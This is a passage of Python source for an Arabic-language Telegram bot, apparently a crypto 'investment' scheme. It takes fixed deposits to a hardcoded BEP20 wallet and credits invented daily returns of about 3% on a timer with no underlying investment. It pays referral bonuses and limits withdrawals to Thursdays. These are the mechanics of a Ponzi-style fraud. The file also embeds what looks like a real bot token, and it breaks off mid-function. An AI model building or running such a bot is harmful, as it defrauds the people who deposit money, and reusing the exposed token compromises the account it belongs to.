import telebot
from telebot import types
import sqlite3
import os
from datetime import datetime
from apscheduler.schedulers.background import BackgroundScheduler

# --- الإعدادات النهائية المعتمدة ---
CONFIG = {
    'TOKEN': '7941946883:AAERwK7lzjt1_xe-iarb5SkE8IXJs-abfrk', 
    'ADMIN_ID': 8499302703, 
    'CHANNEL_ID': '@AP_Fl', 
    'CHANNEL_LINK': 'https://t.me/AP_Fl',
    'SUPPORT_LINK': 'https://wa.me/qr/VPE2KU5DNYCSH1',
    'WALLETS': {
        'BEP20': '0x31d62d87fd666d3e4837c2de682adf1e21510295'
    }
}

bot = telebot.TeleBot(CONFIG['TOKEN'])
DB_NAME = 'bot_database.db'

# --- إدارة قاعدة البيانات SQLite ---
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (uid TEXT PRIMARY KEY, full_name TEXT, balance REAL, withdrawable_profit REAL,
                  referred_by TEXT, referrals_count INTEGER, active_referrals INTEGER,
                  has_deposited INTEGER, deposit_amount REAL, pending_amount REAL)''')
    conn.commit()
    conn.close()

def get_user(uid):
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE uid=?", (str(uid),))
    user = c.fetchone()
    conn.close()
    return user

def add_user(uid, referrer=None):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (uid, balance, withdrawable_profit, referrals_count, active_referrals, has_deposited, deposit_amount, pending_amount, referred_by) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
              (str(uid), 0.0, 0.0, 0, 0, 0, 0.0, 0.0, referrer))
    if referrer:
        c.execute("UPDATE users SET referrals_count = referrals_count + 1 WHERE uid=?", (str(referrer),))
    conn.commit()
    conn.close()

def update_user(uid, **kwargs):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    for key, value in kwargs.items():
        c.execute(f"UPDATE users SET {key}=? WHERE uid=?", (value, str(uid)))
    conn.commit()
    conn.close()

init_db()

# --- نظام الأرباح التلقائي ---
def calculate_profit(amount):
    if amount == 20: return 0.6
    elif amount == 100: return 3.3
    elif amount == 300: return 10.0
    return 0

def add_daily_profits():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE deposit_amount > 0")
    users = c.fetchall()
    
    for user in users:
        profit = calculate_profit(user['deposit_amount'])
        if profit > 0:
            new_balance = user['balance'] + profit
            new_withdraw = user['withdrawable_profit'] + profit
            c.execute("UPDATE users SET balance=?, withdrawable_profit=? WHERE uid=?", 
                      (new_balance, new_withdraw, user['uid']))
            try:
                bot.send_message(user['uid'], f"💰 **أرباح يومية جديدة!**\n📈 تم إضافة: `+{profit}$` لرصيد السحب.", parse_mode='Markdown')
            except: continue
    conn.commit()
    conn.close()

scheduler = BackgroundScheduler()
scheduler.add_job(add_daily_profits, 'interval', hours=24)
scheduler.start()

# --- التحقق من الاشتراك ---
def is_subscribed(user_id):
    try:
        status = bot.get_chat_member(CONFIG['CHANNEL_ID'], user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- أوامر البوت ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    if not is_subscribed(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 انضم للقناة الآن", url=CONFIG['CHANNEL_LINK']))
        bot.send_message(message.chat.id, "⚠️ للبدء، يجب عليك الاشتراك في القناة أولاً!", reply_markup=markup)
        return
    
    user = get_user(uid)
    if not user:
        args = message.text.split()
        referrer = args[1] if len(args) > 1 else None
        add_user(uid, referrer)
        bot.send_message(CONFIG['ADMIN_ID'], f"👤 **مستخدم جديد:** {message.from_user.first_name}")
        user = get_user(uid)

    if not user['full_name']:
        msg = bot.send_message(message.chat.id, "👋 يرجى إرسال اسمك الثلاثي لتفعيل حسابك:")
        bot.register_next_step_handler(msg, save_user_name)
    else: 
        show_menu(message)

def save_user_name(message):
    uid = str(message.from_user.id)
    if message.text and len(message.text.split()) >= 3:
        update_user(uid, full_name=message.text)
        show_menu(message)
    else:
        msg = bot.send_message(message.chat.id, "⚠️ يرجى إرسال الاسم الثلاثي (3 كلمات على الأقل):")
        bot.register_next_step_handler(msg, save_user_name)

def show_menu(message):
    uid = str(message.from_user.id)
    user = get_user(uid)
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("📥 إيداع", callback_data='deposit_start'), 
               types.InlineKeyboardButton("📤 سحب الأرباح", callback_data='withdraw_start'))
    markup.add(types.InlineKeyboardButton("💰 رصيدي", callback_data='view_balance'), 
               types.InlineKeyboardButton("👥 الإحالات", callback_data='referral_info'))
    markup.add(types.InlineKeyboardButton("👨‍💻 الدعم الفني", url=CONFIG['SUPPORT_LINK']))
    
    msg_text = (f"🏠 **لوحة التحكم**\n\n👤 المستثمر: `{user['full_name']}`\n"
                f"💰 الرصيد الكلي: `{user['balance']:.2f}$` \n"
                f"💸 القابل للسحب: `{user['withdrawable_profit']:.2f}$` \n"
                f"👥 الإحالات الكلية: {user['referrals_count']}\n"
                f"✅ الإحالات الفعالة: {user['active_referrals']}")
    bot.send_message(message.chat.id, msg_text, reply_markup=markup, parse_mode='Markdown')

# --- معالجة التفاعلات ---
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    uid = str(call.from_user.id)
    user = get_user(uid)

    if call.data == 'view_balance':
        bot.answer_callback_query(call.id, f"الرصيد: {user['balance']:.2f}$\nللسحب: {user['withdrawable_profit']:.2f}$", show_alert=True)

    elif call.data == 'referral_info':
        bot_username = bot.get_me().username
        ref_link = f"https://t.me/{bot_username}?start={uid}"
        text = (f"👥 **نظام الإحالة**\n\n🎁 اربح 1$ عن كل شخص يشحن حسابه!\n\n🔗 رابط إحالتك:\n`{ref_link}`\n\n📊 إحصائياتك:\n- الإحالات: {user['referrals_count']}\n- الفعالة: {user['active_referrals']}")
        bot.send_message(call.message.chat.id, text, parse_mode='Markdown')

    elif call.data == 'deposit_start':
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("💵 20$ (ربح 0.6$)", callback_data='v_20'), 
                   types.InlineKeyboardButton("💵 100$ (ربح 3.3$)", callback_data='v_100'), 
                   types.InlineKeyboardButton("💵 300$ (ربح 10$)", callback_data='v_300'))
        bot.edit_message_text("💰 اختر باقة الإيداع:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data.startswith('v_'):
        val = int(call.data.split('_')[1])
        update_user(uid, pending_amount=val)
        bot.edit_message_text(f"✅ باقة {val}$\nحول لعنوان BEP20 حصراً:\n`{CONFIG['WALLETS']['BEP20']}`\nثم أرسل صورة الإثبات.", call.message.chat.id, call.message.message_id)

    elif call.data == 'withdraw_start':
        # تم التعديل ليصبح يوم الخميس Thursday
        if datetime.now().strftime("%A") != "Thursday":
            bot.answer_callback_query(call.id, "⚠️ السحب متاح فقط يوم الخميس!", show_alert=True)
            return
        if user['withdrawable_profit'] <= 0:
            bot.answer_callback_query(call.id, "⚠️ لا يوجد رصيد للسحب.", show_alert=True)
            return
        msg = bot.send_message(call.message.chat.id, f"💵 أدخل المبلغ الذي تود سحبه (متاح: {user['withdrawable_profit']:.2f}$):")
        bot.register_next_step_handler(msg, process_withdraw_amount)

    # إدارة الآدمن
    if int(uid) == CONFIG['ADMIN_ID']:
        data = call.data.split('_')
        if data[0] == 'app':
            t_uid, amt = data[1], float(data[2])
            t_user = get_user(t_uid)
            first_profit = calculate_profit(amt)
            update_user(t_uid, balance=amt+first_profit, deposit_amount=amt, withdrawable_profit=first_profit, has_deposited=1)
            
            if t_user['referred_by']:
                ref = get_user(t_user['referred_by'])
                if ref:
                    update_user(ref['uid'], balance=ref['balance']+1.0, withdrawable_profit=ref['withdrawable_profit']+1.0, active_referrals=ref['active_referrals']+1)
            
            bot.send_message(t_uid, "✅ تم تفعيل حسابك بنجاح!")
            bot.edit_message_text(f"✅ تم تفعيل {t_uid}", call.message.chat.id, call.message.message_id)

@bot.message_handler(content_types=['photo'])
def handle_payment_proof(message):
    uid = str(message.from_user.id)
    user = get_user(uid)
    if not user or user['has_deposited']: return
    if user['pending_amount'] == 0:
        bot.send_message(message.chat.id, "⚠️ اختر الباقة أولاً.")
        return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ قبول", callback_data=f"app_{uid}_{user['pending_amount']}"), 
               types.InlineKeyboardButton("❌ رفض", callback_data=f"rej_{uid}"))
    bot.forward_message(CONFIG['ADMIN_ID'], message.chat.id, message.message_id)
    bot.send_message(CONFIG['ADMIN_ID'], f"📩 **إيداع جديد**\n👤: {user['full_name']}\n💵: {user['pending_amount']}$", reply_markup=markup)
    bot.send_message(message.chat.id, "⏳ تم إرسال الإثبات للمراجعة.")

def process_withdraw_amount(message):
    try:
        amt = float(message.text)
        uid = str(message.from_user.id)
        user = get_user(uid)
        if amt > user['withdrawable_profit']:
            bot.send_message(message.chat.id, "⚠️ رصيدك غير كافٍ.")
            return
        msg = bot.send_message(message.chat.id, "💳 أرسل عنوان محفظة **BEP20**:")
        bot.register_next_step_handler(msg, final_withdraw_request, amt)
    except: bot.send_message(message.chat.id, "⚠️ أدخل أرقاماً فقط.")

def final_withdraw_
